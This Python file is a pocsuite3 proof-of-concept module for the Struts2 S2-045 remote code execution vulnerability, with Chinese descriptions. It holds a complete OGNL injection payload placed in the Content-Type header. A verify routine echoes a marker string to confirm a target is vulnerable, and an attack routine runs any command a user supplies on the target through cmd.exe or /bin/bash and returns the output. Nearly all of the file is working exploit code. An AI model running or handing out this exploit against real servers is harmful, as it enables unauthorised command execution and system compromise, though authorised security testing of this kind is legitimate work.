from collections import OrderedDict

from requests.exceptions import ReadTimeout
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE, OptString


class DemoPOC(POCBase):
    vulID = '0'  # ssvid
    version = '1'
    appName = 'Struts2'
    appVersion = '2.3.5-31, 2.5.0-10'
    name = 'Struts2-045远程代码执行'
    desc = '''Struts2-045远程代码执行'''
    pocDesc = '''Struts2-045远程代码执行'''
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    protocol = POC_CATEGORY.PROTOCOL.HTTP
    references = ['https://github.com/vulhub/vulhub/blob/master/struts2/s2-045/README.zh-cn.md']

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("whoami", description="攻击时自定义命令")
        return o

    def _verify(self):
        result = {}
        cmd = "echo VuLnEcHoPoCSuCCeSS"
        HEADERS = {
            'Content-Type': "%{(#xxx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).("
                            "#_memberAccess?(#_memberAccess=#dm):((#container=#context["
                            "'com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance("
                            "@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames("
                            ").clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).("
                            "#cmd='RECOMMAND').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase("
                            ").contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',"
                            "#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).("
                            "#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse("
                            ").getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),"
                            "#ros)).(#ros.flush())} ".replace("RECOMMAND", cmd)
        }
        flag = "VuLnEcHoPoCSuCCeSS"

        try:
            response = requests.get(self.url, headers=HEADERS)
            if response and response.status_code == 200 and flag in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['PostData'] = HEADERS
        except ReadTimeout:
            pass
        except Exception as e:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        result = {}
        cmd = self.get_option("command")
        HEADERS = {
            'Content-Type': "%{(#xxx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).("
                            "#_memberAccess?(#_memberAccess=#dm):((#container=#context["
                            "'com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance("
                            "@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames("
                            ").clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).("
                            "#cmd='RECOMMAND').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase("
                            ").contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',"
                            "#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).("
                            "#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse("
                            ").getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),"
                            "#ros)).(#ros.flush())} ".replace("RECOMMAND", cmd)
        }


        try:
            response = requests.get(self.url, headers=HEADERS)
            if response and response.status_code == 200:
                result['Stdout'] = response.text
        except ReadTimeout:
            pass
        except Exception as e:
            pass

        return self.parse_output(result)


register_poc(DemoPOC)
